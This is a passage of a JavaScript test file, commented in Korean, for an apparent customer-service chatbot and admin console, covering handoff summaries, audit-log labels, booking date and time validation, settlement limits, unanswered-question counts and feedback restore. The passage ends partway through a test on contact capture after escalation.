  // 운영자가 만든 규칙으로 답하던 대화면 그 규칙 이름이 「직전 주제」가 된다.
  const byCustomRule = buildHandoffSummary({
    sessionId,
    channel: 'web',
    reason: 'policy',
    turns: [{ at: '2026-10-01T01:00:00.000Z', speaker: 'customer', text: '쿠폰 다시 주세요', intent: 'cr_m1x2y3' }],
    slots: {},
    intentLabels: { cr_m1x2y3: '쿠폰 재발급 안내' },
  });
  assert.match(byCustomRule.text, /직전 주제: 쿠폰 재발급 안내/);
  assert.equal(byCustomRule.text.includes('cr_m1x2y3'), false, '규칙 코드가 남았다');
});

/**
 * DS 22-4 — 이관 요약이 「어디로 회신해야 하는가」를 지어내지 않는다.
 * 요약 생성은 채널을 언제나 'web' 로 적어 왔다 — 카카오톡에서 온 접수도 홈페이지라고 말했다.
 * 채널을 아는 곳은 세션이므로, 세션에 남은 값을 그대로 따라가는지 실행해서 본다.
 */
test('이관 요약의 채널은 세션이 말하는 대로 적는다 (DS 22-4)', opts, async () => {
  const SESSION_GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, SESSION_GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { updateSession, resetSessions } = await pick('session');
  const esc = await pick('escalation');

  for (const [channel, expected] of [[null, '홈페이지'], ['kakao', '카카오톡']]) {
    resetSessions();
    esc.resetTickets();
    const sid = `rt-ch-${channel ?? 'web'}`;
    if (channel) updateSession(sid, { channel });
    const r = replyTo('상담원 연결해 주세요', sid);
    assert.equal(r.escalate, true, '상담원 전환이 일어나야 이 검증이 의미가 있다');
    const ticket = esc.listTickets()[0];
    assert.ok(ticket?.summary, '티켓에 이관 요약이 붙지 않았다');
    assert.ok(ticket.summary.includes(expected), `${channel ?? 'web'}: 요약이 ${expected} 라고 말하지 않는다\n${ticket.summary.split('\n')[0]}`);
    if (channel === 'kakao') assert.equal(ticket.summary.includes('홈페이지'), false, '카카오 접수를 홈페이지라고 말한다');
  }
  resetSessions();
  esc.resetTickets();
});

/** DS 22-3 — 감사 로그 CSV·목록이 작업을 이름으로 말한다(엑셀로 여는 파일이다). */
test('감사 로그가 작업을 이름으로 말한다 (DS 22-3)', opts, async () => {
  const audit = await importLib('audit');
  audit.resetAudit();
  try {
    audit.logAudit({ action: 'partner.upsert', target: 'PTR-0001', detail: '등록: 가온파트너스', authed: true });
    audit.logAudit({ action: 'settlement.export', target: '2026-09', detail: 'CSV 내려받기', authed: false });

    // 목록(화면이 그대로 그리는 값)
    for (const e of audit.listAudit(10)) {
      assert.equal(/[A-Za-z]/.test(audit.auditActionLabel(e.action)), false, `${e.action}: 표시명에 영문이 섞였다`);
    }
    assert.equal(audit.auditActionLabel('partner.upsert'), '파트너 등록·수정');
    assert.equal(audit.auditActionLabel('settlement.export'), '정산 리포트 내려받기');
    // 옛 스냅샷에서 복원된 모르는 코드도 코드로 내보내지 않는다.
    assert.equal(audit.auditActionLabel('someone.new'), '관리 작업');

    const csv = audit.auditToCsv();
    const [header, first] = csv.split('\r\n');
    assert.equal(header, '번호,시각,작업,작업코드,대상,내용,인증,시각(ISO)', '열 이름이 받는 사람의 말이 아니다');
    assert.ok(first.includes('파트너 등록·수정'), `작업 이름이 빠졌다: ${first}`);
    assert.ok(first.includes('partner.upsert'), '옮겨 담을 코드 열이 빠졌다');
    assert.ok(first.includes('로그인됨'), '인증 여부가 true/false 로 남았다');
  } finally {
    audit.resetAudit();
  }
});

/* ══════════ 디자인 스프린트 — 21차 재감사 (DS 24-3) ══════════ */

/**
 * DS 24-3 — 문맥이 지워진 뒤에 적은 답은 **폼의 답이 아니라 새 질문**이 된다.
 *
 * 위젯이 「한동안 비워 둔 대화」를 알아보고 먼저 밝혀야 하는 이유가 여기 있다. 서버가 30분 뒤
 * 세션 문맥을 지우면(`lib/session.ts`), 화면에 「예약 접수 1/3 · 예약자 성함」 카드가 그대로
 * 떠 있어도 「홍길동」은 폼의 답으로 읽히지 않는다 — 손님은 이름을 잘못 적었다고 생각하고
 * 같은 말을 되풀이한다. 「정말 그렇게 되는가」는 돌려 봐야 안다.
 */
test('세션 문맥이 사라지면 폼의 답이 새 질문이 된다 (DS 24-3)', opts, async () => {
  const SESSION_GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, SESSION_GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { resetSessions } = await pick('session');

  const sid = 'rt-stale-form';
  resetSessions();
  const start = replyTo('예약하고 싶어요', sid);
  assert.ok(start.form, '예약 접수 폼이 시작되지 않았다 — 이 검증의 전제가 깨졌다');
  assert.equal(start.form.step, 1);

  // ① 문맥이 살아 있으면 다음 단계로 간다(정상 흐름).
  const next = replyTo('홍길동', sid);
  assert.ok(next.form, '이어서 답했는데 폼이 끊겼다');
  assert.equal(next.form.step, 2, '성함을 받고도 다음 항목으로 가지 않는다');

  // ② 자리를 비운 사이 서버가 문맥을 지운 상태(TTL 경과 뒤의 `sweep()` 과 같다).
  resetSessions();
  const stale = replyTo('홍길동', sid);
  assert.equal(stale.form, undefined, '문맥이 없는데도 폼이 이어지는 척한다');
  assert.equal(stale.intent, 'fallback', `폼의 답이 새 질문으로 떨어지지 않는다: ${stale.intent}`);
  // 손님이 받는 말은 「무슨 말인지 모르겠다」 — 왜 그런지는 화면이 미리 밝혀 줘야 한다(위젯 DS 24-3).
  assert.ok(stale.reply.includes('이해하지 못했'), `돌아오는 안내가 바뀌었다: ${stale.reply}`);
  resetSessions();
});

/* ══════════ 디자인 스프린트 — 24차 재감사 (DS 27-3) ══════════ */

/**
 * DS 27-3 — 없는 식별자로 저장하면 서버는 **새로 만든다**.
 *
 * 그래서 자료를 지운 뒤 편집 폼을 거두지 않으면 「수정 저장」이 지운 자료를 되살리고, 화면은
 * 「수정되었습니다」라고 말한다(폼은 여전히 수정 모드다) — 변경 이력에는 「생성」으로 남아
 * 둘이 어긋난다. 콘솔 쪽 거두기가 **왜** 필요한지는 이 계약을 돌려 봐야 드러난다.
 */
test('없는 식별자로 저장하면 지운 자료가 되살아난다 (DS 27-3 근거)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false'; // 테스트가 로컬 파일을 건드리지 않게 한다
  const store = await importLib('adminStore', ['knowledge', 'normalize']);

  const entry = { id: 'ds27-ghost', category: '요금', question: '이용료가 얼마인가요?', keywords: ['요금'], answer: '월 9만원입니다.' };
  assert.equal(store.upsertKB(entry).created, true, '전제: 새 자료가 만들어져야 한다');
  assert.equal(store.deleteKB('ds27-ghost'), true, '전제: 삭제되어야 한다');

  // 운영자가 지운 자료를 수정 중이던 폼이 그대로 남아 있었다면, 「수정 저장」은 이 요청을 보낸다.
  const again = store.upsertKB({ ...entry, answer: '월 9만원입니다. (수정)' });
  assert.equal(again.ok, true);
  assert.equal(again.created, true, '서버는 없는 식별자를 수정하지 않는다 — 새로 만든다');
  assert.ok(store.listKB().some((e) => e.id === 'ds27-ghost'), '지운 자료가 되살아나지 않았다면 이 검증의 전제가 깨졌다');

  store.deleteKB('ds27-ghost');
});

/* ══════════ 디자인 스프린트 — 26차 재감사 (DS 29-x) ══════════ */

/**
 * DS 29-3 — 거절 문장을 쓰는 한 곳(`src/lib/refusal.ts`)을 **실제로 돌린다**.
 * 소스 검사만으로는 「조사가 맞게 붙는가」·「이름 없는 키가 코드 키를 흘리지 않는가」를 못 본다.
 */
test('거절 문장이 받침에 맞는 조사로 쓰인다 (DS 29-3)', opts, async () => {
  const R = await importLib('refusal', []);

  // 받침 있음 → 은/을/이 · 받침 없음 → 는/를/가
  assert.equal(R.josa('문서 본문', '은', '는'), '문서 본문은');
  assert.equal(R.josa('카테고리', '은', '는'), '카테고리는');
  assert.equal(R.josa('문서명', '을', '를'), '문서명을');
  assert.equal(R.josa('연락처', '을', '를'), '연락처를');
  assert.equal(R.josa('이름', '이', '가'), '이름이');
  assert.equal(R.josa('방문 희망일', '이', '가'), '방문 희망일이');
  // 한글이 아닌 끝 글자·빈 값에서도 괄호를 남기지 않는다(판정 불가 → 받침 없는 쪽).
  assert.equal(R.josa('CSV', '은', '는'), 'CSV는');
  assert.equal(R.josa('', '은', '는'), '는');
  for (const w of ['문서명', '연락처', 'CSV', '']) {
    assert.equal(/[()]/.test(R.josa(w, '은', '는')), false, `조사 괄호가 남았다: ${w}`);
  }
});

test('거절 문장은 이름 있는 칸만 이름으로 부른다 (DS 29-3)', opts, async () => {
  const R = await importLib('refusal', []);

  // 화면에 그 칸이 있는 자리 — 라벨과 같은 말로 부른다.
  assert.equal(R.requiredMessage('title'), '문서명을 입력해 주세요.');
  assert.equal(R.tooLongMessage('text', 100000), '문서 본문은 100,000자까지 적을 수 있습니다.');
  assert.equal(R.tooLongMessage('reply', 1000), '답변은 1,000자까지 적을 수 있습니다.');
  assert.equal(R.notTextMessage('contact'), '연락처 칸에는 글자만 적을 수 있습니다.');

  // 사용자가 적은 적도 없는 자리 — 이름을 말하지 않는다. 코드 키가 새어 나오면 안 된다.
  for (const key of ['sessionId', 'citation', 'tenant', 'scenarioId', 'id', 'intent', 'verdict', 'kind']) {
    assert.equal(R.fieldLabel(key), null, `${key} 에는 화면 이름이 없어야 한다`);
    for (const msg of [R.requiredMessage(key), R.tooLongMessage(key, 60), R.notTextMessage(key)]) {
      assert.equal(msg.includes(key), false, `거절 문장에 코드 키가 새어 나왔다: ${msg}`);
      assert.equal(/[A-Za-z_]{2,}/.test(msg), false, `거절 문장에 영문 토큰이 남았다: ${msg}`);
    }
  }
});

test('고객에게 되묻는 말에 조사 괄호가 없다 (DS 29-3)', opts, async () => {
  const S = await importLib('slots', ['normalize', 'handoff', 'kst', 'refusal']);
  const slot = { key: 'name', label: '이름', kind: 'text', hint: '예: 홍길동', required: true };
  const dateSlot = { key: 'visitAt', label: '방문 희망일', kind: 'datetime', hint: '예: 내일 오후 3시', required: true };

  const empty = S.validateSlot(slot, '   ');
  assert.equal(empty.ok, false);
  assert.ok(empty.message.startsWith('이름을 입력해 주세요.'), `되묻는 말이 바뀌었다: ${empty.message}`);

  const short = S.validateSlot(slot, '김');
  assert.equal(short.ok, false);
  assert.ok(short.message.startsWith('이름을 조금 더'), short.message);

  const tooLong = S.validateSlot(slot, '가'.repeat(S.MAX_SLOT_VALUE_LEN + 1));
  assert.equal(tooLong.ok, false);
  assert.ok(tooLong.message.startsWith('이름이 너무 길어요'), tooLong.message);

  // 받침 없는 라벨도 같은 문을 지난다.
  const badDate = S.validateSlot(dateSlot, '아무때나');
  assert.equal(badDate.ok, false);
  for (const m of [empty.message, short.message, tooLong.message, badDate.message]) {
    assert.equal(/을\(를\)|이\(가\)|은\(는\)/.test(m), false, `괄호 조사가 남았다: ${m}`);
  }
});

test('접수 상태·대상 거절 문장에 코드 어휘가 없다 (DS 29-3)', opts, async () => {
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);

  const gone = E.updateTicket('ESC-없는번호', { status: 'done' });
  assert.equal(gone.ok, false);
  assert.equal(/티켓/.test(gone.error), false, `내부 어휘가 남았다: ${gone.error}`);
  assert.match(gone.error, /목록을 새로 불러온 뒤/, '다음에 할 일을 말해야 한다');

  const { ticket } = E.createTicket({ sessionId: 's-29', reason: 'user_request', message: '사람 바꿔 주세요' });
  const bad = E.updateTicket(ticket.id, { status: 'ESCALATED' });
  assert.equal(bad.ok, false);
  assert.equal(/상태값|open|in_progress/.test(bad.error), false, `허용값 목록이 새어 나왔다: ${bad.error}`);
  assert.match(bad.error, /목록에서 다시 골라/, '다음에 할 일을 말해야 한다');
});

/* ══════════ 27차 재감사 — 시간의 방향 (DS 30-x) ══════════ */

// 슬롯 엔진만 돌리는 컴파일 묶음(DS 29-3 테스트와 같은 캐시 키를 써 컴파일을 공유한다).
const slotsLib = () => importLib('slots', ['normalize', 'handoff', 'kst', 'refusal']);

/** 예약 슬롯 1개 — 폼 정의를 건드리지 않고 datetime 검증만 돌린다. */
const DT_SLOT = { key: 'datetime', label: '희망 일시', kind: 'datetime', hint: '예: 내일 오후 2시', required: true };

test('지나간 날짜·시각은 예약으로 받지 않는다 (DS 30-1)', opts, async () => {
  const S = await slotsLib();

  // 앞으로의 때는 그대로 받는다(정상 경로를 먼저 고정한다).
  assert.deepEqual(S.validateSlot(DT_SLOT, '오늘 오후 2시', FIXED_NOW), { ok: true, value: '2026-09-03 14:00' });
  assert.deepEqual(S.validateSlot(DT_SLOT, '내일 오전 9시', FIXED_NOW), { ok: true, value: '2026-09-04 09:00' });
  // 지금과 같은 분은 아직 지나지 않았다(경계는 받는 쪽).
  assert.deepEqual(S.validateSlot(DT_SLOT, '오늘 10:00', FIXED_NOW), { ok: true, value: '2026-09-03 10:00' });

  // 연도를 적은 지난 날짜 — 「지났으면 내년」 보정이 닿지 않던 자리다.
  const lastWinter = S.validateSlot(DT_SLOT, '2026-01-05 14:00', FIXED_NOW);
  assert.equal(lastWinter.ok, false);
  assert.match(lastWinter.message, /1월 5일 오후 2시는 이미 지났어요/, lastWinter.message);
  assert.match(lastWinter.message, /앞으로의 날짜·시간/, '다음에 할 일을 말해야 한다');
  // 지난 때는 반쪽이 아니다 — 들고 있을 값이 없다.
  assert.equal(lastWinter.parts, undefined);

  // 오늘의 지난 시각 — 날짜만 비교하면 걸리지 않는 자리(오전 10시에 말한 「오늘 오전 9시」).
  const earlierToday = S.validateSlot(DT_SLOT, '오늘 오전 9시', FIXED_NOW);
  assert.equal(earlierToday.ok, false);
  assert.match(earlierToday.message, /9월 3일 오전 9시는 이미 지났어요/, earlierToday.message);
  // 분 단위까지 본다.
  assert.equal(S.validateSlot(DT_SLOT, '오늘 09:59', FIXED_NOW).ok, false);

  // 한국 시간으로 잰다 — 서버 달력이 아직 어제인 구간(KST 자정~오전 9시)에서도 같은 판정이다.
  const kstEarly = new Date('2026-10-01T02:00:00+09:00');
  assert.equal(S.validateSlot(DT_SLOT, '오늘 오후 2시', kstEarly).ok, true, 'KST 오늘 오후는 앞으로의 때다');
  assert.equal(S.validateSlot(DT_SLOT, '2026-09-30 23:00', kstEarly).ok, false, 'KST 로는 어제다');

  // 거절 문장에 코드 어휘·형식 토큰·괄호 조사가 없다(DS 29-3 과 같은 규칙).
  for (const m of [lastWinter.message, earlierToday.message]) {
    assert.equal(/[A-Za-z]/.test(m), false, `영문 토큰이 남았다: ${m}`);
    assert.equal(/을\(를\)|이\(가\)|은\(는\)/.test(m), false, `괄호 조사가 남았다: ${m}`);
  }
});

test('날짜·시간 반쪽으로는 확정하지 않고 모르는 쪽만 묻는다 (DS 30-2)', opts, async () => {
  const S = await slotsLib();

  // 날짜만 — 알아들은 쪽을 되읽어 주고 시간을 묻는다. 그 반쪽은 돌려받는다.
  const dateOnly = S.validateSlot(DT_SLOT, '내일', FIXED_NOW);
  assert.equal(dateOnly.ok, false);
  assert.match(dateOnly.message, /^9월 4일, 몇 시가 좋을까요\?$/, dateOnly.message);
  assert.deepEqual(dateOnly.parts, { date: '2026-09-04', time: null });

  // 시간만 — 같은 방식으로 날짜를 묻는다.
  const timeOnly = S.validateSlot(DT_SLOT, '오후 2시 30분에요', FIXED_NOW);
  assert.equal(timeOnly.ok, false);
  assert.match(timeOnly.message, /^오후 2시 30분, 며칠이 좋을까요\?$/, timeOnly.message);
  assert.deepEqual(timeOnly.parts, { date: null, time: '14:30' });

  // 둘 다 못 알아들으면 들고 있을 반쪽이 없다(종전 문구 그대로).
  const neither = S.validateSlot(DT_SLOT, '아무때나요', FIXED_NOW);
  assert.equal(neither.ok, false);
  assert.match(neither.message, /날짜·시간을 알아보지 못했어요/);
  assert.equal(neither.parts, undefined);

  // 앞 턴의 반쪽과 합쳐 푼다 — 이번 입력에 있는 쪽이 이긴다.
  assert.deepEqual(S.validateSlot(DT_SLOT, '오후 2시', FIXED_NOW, dateOnly.parts), { ok: true, value: '2026-09-04 14:00' });
  assert.deepEqual(S.validateSlot(DT_SLOT, '내일', FIXED_NOW, timeOnly.parts), { ok: true, value: '2026-09-04 14:30' });
  assert.deepEqual(
    S.validateSlot(DT_SLOT, '9월 10일 11시', FIXED_NOW, dateOnly.parts),
    { ok: true, value: '2026-09-10 11:00' },
    '새로 말한 날짜가 들고 있던 반쪽을 덮어쓴다',
  );
  // 합친 결과도 지난 때면 거절한다(반쪽이라고 통과시키지 않는다).
  assert.equal(S.validateSlot(DT_SLOT, '오늘', FIXED_NOW, { date: null, time: '09:00' }).ok, false);

  // 반쪽 표기 자체는 파서에 그대로 남는다 — 다시 묻는 판단은 검증 쪽 몫이다.
  assert.equal(S.parseDateTime('내일', FIXED_NOW).value, '2026-09-04 (시간 미정)');
  assert.deepEqual(S.parseDateTimeParts('내일', FIXED_NOW), { date: '2026-09-04', time: null });
  assert.deepEqual(S.parseDateTimeParts('', FIXED_NOW), { date: null, time: null });
});

test('나눠 말한 날짜·시간이 한 번에 합쳐져 다음 항목으로 넘어간다 (DS 30-2)', opts, async () => {
  const S = await slotsLib();
  const form = S.getForm('reservation');
  let st = S.startForm(form).state;
  st = S.applyInput(form, st, '홍길동', FIXED_NOW).state;
  assert.equal(st.asked, 'datetime');
  assert.equal(st.partial, undefined, '새 항목은 반쪽을 들고 시작하지 않는다');

  // ① 날짜만 말했다 — 같은 항목을 다시 묻되 알아들은 쪽은 들고 있는다.
  const half = S.applyInput(form, st, '내일', FIXED_NOW);
  assert.equal(half.kind, 'invalid');
  assert.equal(half.slot.key, 'datetime');
  assert.deepEqual(half.state.partial, { date: '2026-09-04', time: null });

  // ② 시간만 말했다 — 합쳐져 확정되고 다음 항목으로 간다. 들고 있던 반쪽은 비워진다.
  const whole = S.applyInput(form, half.state, '오후 2시', FIXED_NOW);
  assert.equal(whole.kind, 'progress');
  assert.equal(whole.slot.key, 'contact');
  assert.equal(whole.state.values.datetime, '2026-09-04 14:00');
  assert.equal(whole.state.partial, undefined, '확정 뒤에도 반쪽이 남으면 다음 항목에 따라붙는다');

  // 「이전」으로 돌아가도 반쪽은 버린다.
  const back = S.applyInput(form, half.state, '이전', FIXED_NOW);
  assert.equal(back.kind, 'progress');
  assert.equal(back.state.partial, undefined);

  // 알아듣지 못한 턴이 끼어도 들고 있던 날짜는 지킨다 — 다시 말하게 하지 않는다.
  const unclear = S.applyInput(form, half.state, '아무때나요', FIXED_NOW);
  assert.equal(unclear.kind, 'invalid');
  assert.deepEqual(unclear.state.partial, { date: '2026-09-04', time: null });
  assert.match(unclear.message, /몇 시가 좋을까요/, '아는 쪽을 또 묻지 않는다');

  // 합친 결과가 지난 때면 반쪽을 비운다 — 틀린 쪽이 날짜인지 시각인지 알 수 없어서,
  // 한쪽만 남겨 두면 다음 턴에 지난 때가 조용히 확정될 수 있다.
  const toTime = S.applyInput(form, st, '오후 2시', FIXED_NOW);
  assert.deepEqual(toTime.state.partial, { date: null, time: '14:00' });
  const past = S.applyInput(form, { ...toTime.state, partial: { date: null, time: '09:00' } }, '오늘', FIXED_NOW);
  assert.equal(past.kind, 'invalid');
  assert.match(past.message, /이미 지났어요/);
  assert.equal(past.state.partial, undefined);

  // 반쪽만 되풀이해도 무한히 되묻지 않는다 — 한도를 넘으면 상담원에게 넘어간다.
  let loop = S.applyInput(form, st, '내일', FIXED_NOW);
  loop = S.applyInput(form, loop.state, '내일', FIXED_NOW);
  loop = S.applyInput(form, loop.state, '내일', FIXED_NOW);
  assert.equal(loop.kind, 'max_retry', `반쪽만 ${S.MAX_SLOT_RETRIES}번이면 사람에게 넘겨야 한다`);
});

test('아직 오지 않은 달의 수수료 합계는 산출하지 않는다 (DS 30-3)', opts, async () => {
  const { S } = await settlementLib();
  const at = new Date('2026-10-07T10:00:00+09:00');

  const future = S.buildSettlement({ month: '2027-01', accounts: [], at });
  assert.equal(future.ok, false, '내년 달이 산출되면 일어나지 않은 금액이 확정 수치처럼 뜬다');
  assert.match(future.error, /아직 오지 않은 달은 산출할 수 없습니다/);
  assert.match(future.error, /2026년 10월까지 고를 수 있습니다/, '어디까지 고를 수 있는지 말해야 한다');
  // 바로 다음 달도 막는다(한 달 차이가 더 그럴듯해서 더 위험하다).
  assert.equal(S.buildSettlement({ month: '2026-11', accounts: [], at }).ok, false);

  // 이번 달·지난달은 그대로 산출한다.
  assert.equal(S.buildSettlement({ month: '2026-10', accounts: [], at }).ok, true);
  assert.equal(S.buildSettlement({ month: '2026-09', accounts: [], at }).ok, true);

  // 「이번 달」은 한국 시간으로 센다 — 서버 달력이 아직 지난달인 구간(KST 1일 새벽)에서도
  // 운영자가 보고 있는 달은 열려 있어야 한다(DS 21-2 와 같은 기준).
  const kstFirst = new Date('2026-11-01T02:00:00+09:00');
  assert.equal(S.buildSettlement({ month: '2026-11', accounts: [], at: kstFirst }).ok, true);
  assert.equal(S.buildSettlement({ month: '2026-12', accounts: [], at: kstFirst }).ok, false);

  // 거절 문장에 코드 어휘·형식 토큰이 없다(DS 29-3 과 같은 규칙).
  assert.equal(/[A-Za-z]/.test(future.error), false, `영문 토큰이 남았다: ${future.error}`);
  assert.equal(/\d{4}-\d{2}/.test(future.error), false, `형식 그대로의 달 표기가 남았다: ${future.error}`);
});

/* ══════════ 디자인 스프린트 — 29차 재감사 (DS 32-1·32-2) ══════════ */

const CONVLOG_DEPS = ['chat', 'storage', 'logger', 'monitoring', 'knowledge', 'normalize', 'rules', 'adminStore', 'slots', 'session', 'llm', 'tenantKB', 'ingest'];

test('답하지 못한 질문을 묶어 세고, 보여 준 수를 찾은 수라고 말하지 않는다 (DS 32-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const { logTurn, resetLogs, unansweredQuestions } = await importLib('convlog', CONVLOG_DEPS);
  resetLogs();

  const turn = (message, source) => logTurn({
    sessionId: `s-${message}-${source}`, channel: 'web', message, reply: '답', intent: 'fallback',
    source, escalate: false,
  });

  // 기록이 없으면 지어내지 않는다.
  assert.deepEqual(unansweredQuestions(), { items: [], groups: 0, turns: 0 });

  // 같은 질문은 띄어쓰기·대소문자가 달라도 한 묶음이다 — 운영자에게는 같은 질문이다.
  turn('환불 되나요?', 'fallback');
  turn('환불되나요?', 'fallback');
  turn('ENVIRONMENT 인증서 주나요', 'fallback');
  turn('environment 인증서 주나요', 'fallback');
  // 자료·규칙으로 답한 대화는 「답하지 못한 질문」이 아니다.
  turn('영업시간 알려주세요', 'kb');
  turn('규칙으로 답한 질문', 'rule');

  const r = unansweredQuestions();
  assert.equal(r.groups, 2, '같은 질문이 묶이지 않았다');
  assert.equal(r.turns, 4, '묶기 전의 총 횟수를 세야 한다');
  assert.equal(r.items.length, 2);
  assert.equal(r.items.every((i) => i.count === 2), true, '묶음마다 몇 번 왔는지 세야 한다');
  // 화면에 보이는 표기는 **가장 최근에 받은 것**이다(뒤에 온 것으로 갱신).
  assert.equal(r.items.find((i) => i.question.includes('환불')).question, '환불되나요?');

  // 자주 온 질문이 위에 온다.
  turn('주차 되나요', 'fallback');
  turn('주차 되나요', 'fallback');
  turn('주차 되나요', 'fallback');
  assert.equal(unansweredQuestions().items[0].question, '주차 되나요', '자주 온 질문이 위에 있어야 한다');

  // 잘라도 **자르기 전의 묶음 수**를 함께 돌려준다(DS 31-3 — 보여 준 수 ≠ 찾은 수).
  const cut = unansweredQuestions(1);
  assert.equal(cut.items.length, 1);
  assert.equal(cut.groups, 3, '자른 수를 전체라고 말하면 나머지를 영영 찾지 않는다');
  assert.equal(cut.turns, 7);
  resetLogs();
});

test('답변 평가는 재시작을 넘겨 남고, 어긋난 스냅샷은 건너뛴다 (DS 32-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  F.resetFeedback();

  assert.equal(F.FEEDBACK_NS, 'feedback', '저장소 네임스페이스가 없으면 재시작마다 평가가 사라진다');
  F.recordFeedback({ sessionHash: 'h1', verdict: 'up', citation: '이음 FAQ 1. 신청' });
  F.recordFeedback({ sessionHash: 'h2', verdict: 'down', citation: '이음 FAQ 3. 활동 시간' });
  const snap = F.exportFeedback();
  assert.equal(snap.entries.length, 2);

  F.resetFeedback();
  assert.equal(F.feedbackSummary().total, 0);
  const back = F.importFeedback(snap);
  assert.equal(back.ok, true);
  assert.equal(back.count, 2, '복원이 평가를 잃었다');
  const sum = F.feedbackSummary();
  assert.equal(sum.total, 2);
  assert.equal(sum.helpfulRate, 50);
  // 저장분에 적혀 있던 **이름은 들고 오지 않는다** (DS 53-2) — 이름은 지금 KB 에서 붙인다.
  // 자료 id 없이 남은 평가라 지금은 이름을 댈 수 없다. 그렇다고 「근거 없음」(등록 자료 없이
  // 답한 답변)으로 세지는 않는다 (DS 58-2) — 근거는 있었고, 어느 자료인지만 모른다.
  assert.equal(sum.topDown[0].citation, F.UNKNOWN_KB_LABEL);
  assert.equal(sum.topDown[0].citationLost, true);
  assert.notEqual(F.UNKNOWN_KB_LABEL, F.NO_CITATION_LABEL, '두 사실이 같은 말로 적힌다');

  // 평가값이 아닌 항목은 집계를 비뚤게 만든다 — 건너뛴다.
  const dirty = F.importFeedback({
    version: 1,
    savedAt: '',
    seq: 9,
    entries: [
      { id: 'F-000001', sessionHash: 'h1', verdict: '최고', citation: 'x', channel: 'web', at: '' },
      { id: '', sessionHash: 'h2', verdict: 'up', citation: 'x', channel: 'web', at: '' },
      { id: 'F-000003', sessionHash: '', verdict: 'up', citation: 'x', channel: 'web', at: '' },
      { id: 'F-000004', sessionHash: 'h4', verdict: 'down', citation: 'y', channel: 'web', at: '2026-10-10T00:00:00.000Z' },
    ],
  });
  assert.equal(dirty.ok, true);
  assert.equal(dirty.count, 1, '형식이 어긋난 평가가 집계에 들어갔다');

  // 형식 자체가 아닌 것은 사유를 돌려준다(복원 실패를 조용히 삼키지 않는다).
  assert.equal(F.importFeedback(null).ok, false);
  assert.equal(F.importFeedback({ version: 1 }).ok, false);
  F.resetFeedback();
});

/* ══════════ 디자인 스프린트 — 32차 재감사 (DS 35-3) ══════════ */

/**
 * DS 35-3 — 위젯 카드가 연락처 질문을 끝냈는데 **서버는 계속 묻고 있던** 자리.
 *
 * 규칙 전환(`escalateWith`)은 접수한 뒤 `awaitingContact` 를 켜고 대화창으로 연락처를 묻는다.
 * 그런데 그 직전 폴백 답변에는 위젯의 「상담원 연결하기」가 그대로 붙어 있어(escalate 이면서
 * 접수번호가 없는 답변이다), 고객은 **카드에서** 연락처를 남기거나 「연락처 없이 접수」를 고른다.
 * 그러면 물은 것은 이미 답을 받았는데 서버는 계속 기다리는 상태였다 — 다음에 고객이 하는
 * **보통 질문**이 연락처 수집 턴으로 먼저 해석된다. 「정말 그렇게 되는가」는 돌려 봐야 안다.
 */
test('위젯 카드로 접수한 뒤의 질문이 연락처로 읽히지 않는다 (DS 35-3)', opts, async () => {
  const SESSION_GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, SESSION_GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { updateSession, getSession, resetSessions } = await pick('session');
  const esc = await pick('escalation');

  /**
   * 규칙 전환 → 위젯 카드로 접수까지. `clears` 가 참이면 `/api/escalation` 이 연락처를 묻는
   * 상태를 거두는 쪽(이번 고침)이고, 거짓이면 종전 동작이다.
   */
  const setup = (sid, clears) => {
    resetSessions();
    esc.resetTickets();
    const first = replyTo('상담원 연결해 주세요', sid);
    assert.equal(first.escalate, true, '상담원 전환이 일어나야 이 검증이 의미가 있다');
    assert.equal(getSession(sid).awaitingContact, true, '서버가 연락처를 묻지 않는다 — 전제가 깨졌다');
    // 카드가 보내는 것 = `/api/escalation` POST(열린 접수는 세션당 재사용된다).
    const { ticket } = esc.createTicket({
      sessionId: sid,
      reason: 'user_request',
      message: '상담원 연결해 주세요',
      contact: '010-1234-5678',
    });
    updateSession(sid, { ticketId: ticket.id, handoffReason: 'customer_request', ...(clears ? { awaitingContact: false } : {}) });
    assert.equal(ticket.contact, '010-1234-5678', '카드가 보낸 연락처가 접수에 붙지 않았다');
    assert.equal(Boolean(getSession(sid).awaitingContact), !clears, '연락처를 묻는 상태가 기대와 다르다');
    return ticket;
  };

  // ① 보통 질문이 「건너뛰기」로 읽혀 **질문이 사라진다**.
  setup('rt-ds35-skip-old', false);
  const skipOld = replyTo('환불 수수료는 없어요?', 'rt-ds35-skip-old');
  assert.equal(skipOld.intent, 'contact_skipped', '이 결함이 재현되지 않으면 이 검증은 아무것도 지키지 않는다');

  setup('rt-ds35-skip-new', true);
  const skipNew = replyTo('환불 수수료는 없어요?', 'rt-ds35-skip-new');
  assert.notEqual(skipNew.intent, 'contact_skipped', '카드가 끝낸 질문을 대화창이 다시 묻는다');
  // 「건너뛰기」로 읽혔을 때만 나가는 말 — 문구는 DS 45-1 에서 바뀌었고, 검사의 뜻은 그대로다.
  assert.equal(skipNew.reply.includes('접수는 그대로 남아 있어요'), false, '질문은 사라지고 접수 안내만 남는다');

  // ② 질문에 섞인 **남의 번호**가 고객의 연락처로 저장된다(상담원은 그 번호로 전화한다).
  const old = setup('rt-ds35-num-old', false);
  const numOld = replyTo('매장 번호 02-123-4567로 전화했는데 안 받아요', 'rt-ds35-num-old');
  assert.equal(numOld.intent, 'contact_captured', '이 결함이 재현되지 않으면 이 검증은 아무것도 지키지 않는다');
  assert.equal(esc.getTicket(old.id).contact, '02-123-4567', '덮어쓰기가 재현되지 않는다');

  const fixed = setup('rt-ds35-num-new', true);
